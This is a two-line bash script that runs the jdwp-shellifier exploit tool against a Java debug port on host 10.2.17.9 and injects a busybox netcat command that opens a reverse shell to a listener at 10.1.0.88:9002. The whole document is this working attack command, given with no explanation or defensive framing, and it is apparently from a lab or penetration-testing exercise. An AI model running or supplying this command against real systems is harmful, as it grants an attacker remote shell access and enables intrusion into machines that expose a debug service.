#!/usr/bin/env bash

python3 jdwp-shellifier.py -t 10.2.17.9 -p 8000 -c "/bin/busybox nc 10.1.0.88 9002 -e /bin/bash"
